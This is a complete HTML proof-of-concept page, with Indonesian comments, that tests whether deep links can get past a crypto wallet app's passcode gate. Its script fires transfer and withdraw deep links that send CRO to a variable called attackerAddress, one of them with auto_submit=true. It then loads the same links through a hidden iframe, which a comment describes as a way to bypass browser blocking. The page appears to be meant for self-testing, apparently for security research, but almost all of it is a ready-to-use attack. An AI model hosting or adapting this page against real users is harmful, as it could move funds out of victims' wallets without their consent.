<!DOCTYPE html>
<html>
<head>
<title>Deep-link Test - Ult App</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="font-family:sans-serif; padding:20px">
<h2>Ult App Deep-link PoC</h2>
<p>Ini untuk test apakah bisa skip passcode gate</p>

<button onclick="test('transfer')">Test Transfer Deep-link</button>
<button onclick="test('withdraw')">Test Withdraw Deep-link</button>
<button onclick="test('qr')">Test QR Payload</button>

<script>
function test(type) {
  // GANTI alamat ini dengan alamat wallet akun ke-2 kamu sendiri
  const attackerAddress = "0xYOUR_OWN_WALLET_2";

  let urls = {
    transfer: `ultapp://transfer?to=${attackerAddress}&amount=0.001&asset=CRO&auto_submit=true`,
    withdraw: `ultapp://withdraw?to=${attackerAddress}&amount=0.001&asset=CRO`,
    qr: `https://ult.com/qr?data=ultapp://transfer?to=${attackerAddress}&amount=1000`
  };

  // Universal Link + Custom Scheme, 2 metode
  console.log("Trying: " + urls[type]);
  window.location.href = urls[type];

  // fallback iframe untuk bypass browser block
  setTimeout(() => {
    let iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = urls[type];
    document.body.appendChild(iframe);
  }, 500);
}
</script>
